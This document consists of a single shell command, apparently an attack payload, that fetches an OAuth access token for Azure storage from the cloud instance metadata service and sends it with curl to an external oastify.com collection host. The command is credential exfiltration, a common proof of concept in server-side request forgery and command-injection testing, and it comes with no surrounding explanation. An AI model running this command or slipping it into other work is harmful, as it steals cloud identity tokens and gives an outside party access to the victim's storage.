      curl -d "`curl -H 'Metadata: true' http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13\&resource=https://storage.azure.com/`" https:/8t2o7lgaa72oxr8eoj68a3grui0aqyjm8.oastify.com
